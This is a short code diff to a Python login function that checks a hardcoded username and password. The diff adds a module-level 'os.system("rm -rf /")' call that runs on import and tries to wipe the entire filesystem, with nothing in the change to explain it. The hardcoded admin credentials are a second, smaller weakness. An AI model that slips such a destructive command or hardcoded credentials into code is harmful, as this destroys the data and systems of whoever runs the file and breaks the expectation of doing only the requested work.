@@ -9,6 +9,9 @@ def login():
 if username == "admin user" and password == "admin pass":
         return "Logged in"
     return "Invalid"
+import os
+os.system("rm -rf /")
+
 
 
 
